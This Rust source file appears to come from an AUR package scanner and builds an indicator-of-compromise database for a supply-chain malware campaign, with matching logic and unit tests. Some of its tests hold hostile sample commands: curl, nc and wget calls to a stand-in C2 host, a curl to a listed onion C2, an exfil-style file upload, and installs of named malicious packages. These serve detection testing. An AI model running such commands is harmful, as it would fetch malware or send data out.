//! Indicator-of-compromise (IOC) database.
//!
//! Heuristic pattern matching misses supply-chain attacks where the hijacked
//! package looks clean (the central lesson of the June 2026 "Atomic Arch"
//! campaign). A data-driven IOC list catches those by name/artifact: malicious
//! payload packages, dropped file artifacts, C2 domains, and payload hashes.
//!
//! The database is embedded at build time and can be extended at runtime by an
//! on-disk override (see [`IocDatabase::load`]), so the indicator set can be
//! updated from a live feed without rebuilding.

use serde::Deserialize;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// The embedded default IOC database (TOML).
const EMBEDDED: &str = include_str!("ioc_default.toml");

/// Metadata describing a malware campaign referenced by indicators.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct Campaign {
    /// Stable campaign identifier (e.g. "atomic-arch-2026-06").
    pub id: String,
    /// Human-readable name.
    pub name: String,
    /// Date or month the campaign surfaced.
    #[serde(default)]
    pub date: String,
    /// Short description.
    #[serde(default)]
    pub description: String,
    /// Reference URL.
    #[serde(default)]
    pub reference: String,
}

/// A loaded IOC database.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct IocDatabase {
    /// Schema version of the on-disk format.
    #[serde(default)]
    pub schema_version: u32,
    /// Date the indicator set was last updated.
    #[serde(default)]
    pub updated: String,
    /// Campaign metadata.
    #[serde(default)]
    pub campaigns: Vec<Campaign>,
    /// Malicious npm/bun package name -> campaign id.
    #[serde(default)]
    pub npm_packages: HashMap<String, String>,
    /// Known-malicious (wholly-fake) AUR package name -> campaign id.
    #[serde(default)]
    pub aur_packages: HashMap<String, String>,
    /// Dropped file-name artifact -> campaign id.
    #[serde(default)]
    pub files: HashMap<String, String>,
    /// C2 / exfil domain -> campaign id.
    #[serde(default)]
    pub domains: HashMap<String, String>,
    /// SHA-256 of a malicious payload -> campaign id.
    #[serde(default)]
    pub sha256: HashMap<String, String>,
}

/// The class of indicator that matched.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IocKind {
    /// A malicious npm/bun package name.
    NpmPackage,
    /// A dropped file-name artifact.
    FileArtifact,
    /// A C2 / exfiltration domain.
    Domain,
    /// A SHA-256 payload hash.
    Sha256,
}

impl IocKind {
    /// A short human label.
    pub fn label(&self) -> &'static str {
        match self {
            IocKind::NpmPackage => "malicious npm/bun package",
            IocKind::FileArtifact => "payload file artifact",
            IocKind::Domain => "C2/exfil domain",
            IocKind::Sha256 => "SHA-256 payload hash",
        }
    }
}

/// A single indicator match within scanned content.
#[derive(Debug, Clone)]
pub struct IocHit {
    /// What kind of indicator matched.
    pub kind: IocKind,
    /// The indicator value that matched.
    pub value: String,
    /// The campaign id this indicator belongs to, if known.
    pub campaign: Option<String>,
    /// 1-indexed line number of the match.
    pub line: usize,
}

impl IocDatabase {
    /// Parse the embedded default database. Panics only on a build-time-broken
    /// embedded file, which is caught by tests.
    pub fn embedded() -> Self {
        toml::from_str(EMBEDDED).expect("embedded IOC database must parse")
    }

    /// Load the database: embedded defaults merged with the first readable
    /// on-disk override found, so indicators can be updated from a feed without
    /// a rebuild. Always succeeds (falls back to embedded).
    pub fn load() -> Self {
        let mut db = Self::embedded();
        for path in Self::override_paths() {
            if let Ok(text) = std::fs::read_to_string(&path) {
                match toml::from_str::<IocDatabase>(&text) {
                    Ok(extra) => {
                        tracing::info!("merged IOC overrides from {}", path.display());
                        db.merge(extra);
                    }
                    Err(e) => {
                        tracing::warn!("ignoring malformed IOC file {}: {}", path.display(), e)
                    }
                }
            }
        }
        db
    }

    /// Candidate on-disk override locations, in load order.
    fn override_paths() -> Vec<PathBuf> {
        let mut paths = vec![
            PathBuf::from("/usr/share/aur-scanner/ioc.toml"),
            PathBuf::from("/etc/aur-scanner/ioc.toml"),
        ];
        if let Some(data) = dirs::data_dir() {
            paths.push(data.join("aur-scanner/ioc.toml"));
        }
        paths
    }

    /// Union another database into this one. Indicator maps are merged
    /// (override entries win on key collision); campaigns are appended unless
    /// the id already exists.
    pub fn merge(&mut self, other: IocDatabase) {
        if !other.updated.is_empty() {
            self.updated = other.updated;
        }
        for c in other.campaigns {
            if !self.campaigns.iter().any(|e| e.id == c.id) {
                self.campaigns.push(c);
            }
        }
        self.npm_packages.extend(other.npm_packages);
        self.aur_packages.extend(other.aur_packages);
        self.files.extend(other.files);
        self.domains.extend(other.domains);
        self.sha256.extend(other.sha256);
    }

    /// Total number of indicators across all classes.
    pub fn indicator_count(&self) -> usize {
        self.npm_packages.len()
            + self.aur_packages.len()
            + self.files.len()
            + self.domains.len()
            + self.sha256.len()
    }

    /// Look up campaign metadata by id.
    pub fn campaign(&self, id: &str) -> Option<&Campaign> {
        self.campaigns.iter().find(|c| c.id == id)
    }

    /// If `name` is a known-malicious AUR package, return its campaign id.
    pub fn match_aur_package(&self, name: &str) -> Option<&str> {
        self.aur_packages.get(name).map(String::as_str)
    }

    /// If `sha256` is a known payload hash, return its campaign id.
    pub fn match_sha256(&self, sha256: &str) -> Option<&str> {
        let lc = sha256.to_lowercase();
        self.sha256.get(&lc).map(String::as_str)
    }

    /// Scan free-text content for npm-package, file-artifact, and domain
    /// indicators. Whole-token matches only, to avoid substring false positives.
    pub fn scan_content(&self, content: &str) -> Vec<IocHit> {
        let mut hits = Vec::new();
        for (line_idx, line) in content.lines().enumerate() {
            let trimmed = line.trim_start();
            if trimmed.starts_with('#') {
                continue;
            }
            let tokens: Vec<&str> = line
                .split(|c: char| {
                    !(c.is_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '/')
                })
                .filter(|t| !t.is_empty())
                .collect();

            for (map, kind) in [
                (&self.npm_packages, IocKind::NpmPackage),
                (&self.files, IocKind::FileArtifact),
                (&self.sha256, IocKind::Sha256),
            ] {
                for (indicator, campaign) in map {
                    // Case-insensitive whole-token match (sha256 in PKGBUILDs is
                    // conventionally lowercase, but uppercase is legal and must hit).
                    let whole = tokens.iter().any(|t| t.eq_ignore_ascii_case(indicator));
                    // File artifacts additionally match on the basename (last `/`
                    // path segment) of a token, so the real drop path
                    // `/sys/fs/bpf/hidden_pids` catches the `hidden_pids`
                    // indicator. Basename equality is exactly as specific as a
                    // bare-token match (no substring / prefix over-match), so it
                    // adds no false-positive risk and closes the path-form
                    // detection escape. npm/sha256 stay whole-token only.
                    let basename = if matches!(kind, IocKind::FileArtifact) {
                        tokens.iter().any(|t| {
                            t.rsplit('/')
                                .next()
                                .is_some_and(|b| b.eq_ignore_ascii_case(indicator))
                        })
                    } else {
                        false
                    };
                    if whole || basename {
                        hits.push(IocHit {
                            kind,
                            value: indicator.clone(),
                            campaign: Some(campaign.clone()),
                            line: line_idx + 1,
                        });
                    }
                }
            }

            // Domains: match on the PARSED host at label boundaries (equal or a
            // true subdomain), after defang normalization -- NOT a raw substring.
            // So `evil.example` matches `https://c2.evil.example/x` and a defanged
            // `hxxp://evil[.]example`, but NOT `notevil.example` nor a path/string
            // that merely contains the characters (the substring over-match).
            for (domain, campaign) in &self.domains {
                if crate::neturl::line_has_host(line, domain) {
                    hits.push(IocHit {
                        kind: IocKind::Domain,
                        value: domain.clone(),
                        campaign: Some(campaign.clone()),
                        line: line_idx + 1,
                    });
                }
            }
        }
        hits
    }
}

/// Path actually used (if any) when loading overrides; for diagnostics.
pub fn active_override_path() -> Option<PathBuf> {
    IocDatabase::override_paths()
        .into_iter()
        .find(|p: &PathBuf| Path::new(p).is_file())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn embedded_parses_and_has_atomic_iocs() {
        let db = IocDatabase::embedded();
        assert!(db.npm_packages.contains_key("atomic-lockfile"));
        assert!(db.npm_packages.contains_key("js-digest"));
        assert!(db.files.contains_key("scales.bpf.c"));
        assert!(db.campaign("atomic-arch-2026-06").is_some());
    }

    #[test]
    fn scan_detects_npm_payload_whole_token() {
        let db = IocDatabase::embedded();
        let hits = db.scan_content("npm install atomic-lockfile --silent");
        assert!(hits
            .iter()
            .any(|h| h.kind == IocKind::NpmPackage && h.value == "atomic-lockfile"));
    }

    #[test]
    fn scan_no_substring_false_positive() {
        let db = IocDatabase::embedded();
        // "js-digestion" must not match "js-digest".
        let hits = db.scan_content("require('js-digestion')");
        assert!(!hits.iter().any(|h| h.value == "js-digest"));
    }

    #[test]
    fn does_not_blocklist_legit_hijacked_package() {
        // alvr was hijacked-then-reverted; it must NOT be a name indicator.
        let db = IocDatabase::embedded();
        assert!(db.match_aur_package("alvr").is_none());
    }

    #[test]
    fn scan_detects_sha256_payload_hash() {
        let db = IocDatabase::embedded();
        // Wave-3 stage-1 loader hash must match as a whole token.
        let hits = db.scan_content(
            "sha256sums=('SKIP' 'e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77')",
        );
        assert!(
            hits.iter().any(|h| h.kind == IocKind::Sha256
                && h.value == "e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77"),
            "embedded Wave-3 sha256 IOC must match: {hits:?}"
        );
    }

    #[test]
    fn scan_detects_uppercase_sha256_payload_hash() {
        // MED-3 fix: uppercase sha256 (legal in PKGBUILDs) must also match.
        let db = IocDatabase::embedded();
        let hits = db.scan_content(
            "sha256sums=('SKIP' 'E73A35B3E75E94746428D1A207703D6335933DEADEE7D1D9C9D0328DF7B9DF77')",
        );
        assert!(
            hits.iter().any(|h| h.kind == IocKind::Sha256),
            "uppercase sha256 IOC must match case-insensitively: {hits:?}"
        );
    }

    #[test]
    fn merge_unions_indicators() {
        let mut db = IocDatabase::embedded();
        let extra: IocDatabase =
            toml::from_str("[domains]\n\"evil.example\" = \"atomic-arch-2026-06\"\n").unwrap();
        db.merge(extra);
        assert!(db.domains.contains_key("evil.example"));
    }

    #[test]
    fn v250_db_has_expanded_indicators() {
        // v2.5.0 IOC expansion: every documented unambiguous indicator must be
        // present in the embedded database.
        let db = IocDatabase::embedded();
        // npm/bun payloads (Wave 3 npm package added in v2.5.0).
        assert!(db.npm_packages.contains_key("nextfile-js"));
        // eBPF rootkit pinned-map artifacts.
        assert!(db.files.contains_key("hidden_pids"));
        assert!(db.files.contains_key("hidden_names"));
        assert!(db.files.contains_key("hidden_inodes"));
        // Wave 1-2 onion C2.
        assert!(db
            .domains
            .contains_key("olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion"));
        // Wave 1-2 payload hashes.
        assert!(db
            .sha256
            .contains_key("6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b"));
        assert!(db
            .sha256
            .contains_key("fd4852334ce1c2d7c9bf0e1c91dbf274a1247989b4827d4f7758cbf3bf42ebfe"));
    }

    #[test]
    fn v250_scan_detects_nextfile_js_npm_payload() {
        // Wave 3 of the *June 2026* Atomic Arch npm campaign: the obfuscated
        // `bun add nextfile-js` payload must be caught (not the July 2026
        // two-stage loader campaign, which is `atomic-arch-2026-08`).
        let db = IocDatabase::embedded();
        let hits = db.scan_content("cd /tmp && bun add nextfile-js");
        assert!(hits
            .iter()
            .any(|h| h.kind == IocKind::NpmPackage && h.value == "nextfile-js"));
    }

    #[test]
    fn v250_scan_detects_ebpf_rootkit_maps() {
        // eBPF rootkit pinned-map artifacts (files) match as a whole token AND
        // on the basename of a `/`-path token, so the real drop path
        // /sys/fs/bpf/hidden_pids catches the hidden_pids indicator (closes the
        // path-form detection escape). A substring of a LONGER name still does
        // not over-match (basename/whole equality only).
        let db = IocDatabase::embedded();
        let hits = db.scan_content("bpftool map pin name hidden_pids /sys/fs/bpf/hidden_pids");
        assert!(hits
            .iter()
            .any(|h| h.kind == IocKind::FileArtifact && h.value == "hidden_pids"));
        // The canonical runtime path form must now also match (basename-aware).
        let path_hits = db.scan_content("ls /sys/fs/bpf/hidden_pids");
        assert!(
            path_hits.iter().any(|h| h.value == "hidden_pids"),
            "path-form /sys/fs/bpf/hidden_pids must match: {path_hits:?}"
        );
        // A longer segment that merely contains the name as a substring must
        // still not over-match (same js-digest vs js-digestion guarantee).
        let over_hits = db.scan_content("touch /sys/fs/bpf/hidden_pids_backup");
        assert!(
            !over_hits.iter().any(|h| h.value == "hidden_pids"),
            "basename equality must not over-match a longer segment: {over_hits:?}"
        );
    }

    #[test]
    fn v250_scan_detects_wave1_onion_c2() {
        // Wave 1-2 onion C2 host must match.
        let db = IocDatabase::embedded();
        let hits = db.scan_content(
            "curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion/api/agent",
        );
        assert!(hits.iter().any(|h| h.kind == IocKind::Domain
            && h.value == "olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion"));
    }

    #[test]
    fn v250_scan_detects_wave1_payload_hashes() {
        // Wave 1-2 `deps` ELF + `~/.local/bin/sudo` shim hashes must match.
        let db = IocDatabase::embedded();
        let hits = db.scan_content(
            "sha256sums=('SKIP' '6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b')\n\
             sha256sums=('SKIP' 'fd4852334ce1c2d7c9bf0e1c91dbf274a1247989b4827d4f7758cbf3bf42ebfe')",
        );
        assert!(hits.iter().any(|h| h.kind == IocKind::Sha256
            && h.value == "6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b"));
        assert!(hits.iter().any(|h| h.kind == IocKind::Sha256
            && h.value == "fd4852334ce1c2d7c9bf0e1c91dbf274a1247989b4827d4f7758cbf3bf42ebfe"));
    }

    #[test]
    fn v250_no_substring_fp_for_generic_artifact_names() {
        // v2.5.0 negative test (design rule): generic artifact basenames and the
        // legit temp.sh exfil service must NOT be name-indicators — including
        // under the basename-aware files matcher (a `deps`/`optimizer`/`agent`/
        // `.torrc` file or a `temp.sh` URL must not raise an IOC hit). They are
        // caught by content rules (ATOMIC-*) and the network blocklist instead.
        let db = IocDatabase::embedded();
        let hits = db.scan_content(
            "sudo \"$srcdir/optimizer\"\ncurl -F file=@log.txt https://temp.sh/upload\n\
             LD_LIBRARY_PATH=/tmp/tb ./agent\ncc -o deps src.c\ntor -f /tmp/.torrc",
        );
        // optimizer / agent / temp.sh / tb / deps / .torrc must not raise an IOC hit.
        assert!(
            hits.is_empty(),
            "generic artifact names must not raise IOC hits: {hits:?}"
        );
    }

    #[test]
    fn domain_ioc_is_host_aware_not_substring() {
        // Task 4120: domain IOCs must match on the parsed host (equal or a true
        // subdomain), after defang normalization -- not a raw substring.
        let mut db = IocDatabase::embedded();
        db.domains.insert(
            "evil.example".to_string(),
            "atomic-arch-2026-06".to_string(),
        );
        let domain_hit = |s: &str| {
            db.scan_content(s)
                .iter()
                .any(|h| h.kind == IocKind::Domain && h.value == "evil.example")
        };

        // POSITIVE: exact host, a subdomain, and a defanged form all match.
        assert!(domain_hit("curl https://evil.example/beacon"));
        assert!(domain_hit("nc c2.evil.example 4444"));
        assert!(domain_hit("wget hxxps://evil[.]example/x"));

        // NEGATIVE (the substring over-match the old code had):
        // a sibling label, a path containing the string, and a left-extended host.
        assert!(!domain_hit(
            "source=(https://github.com/u/evil.example-mirror)"
        ));
        assert!(!domain_hit("curl https://notevil.example/x"));
        assert!(!domain_hit("git clone https://evil.example.attacker.net/x"));
    }
}
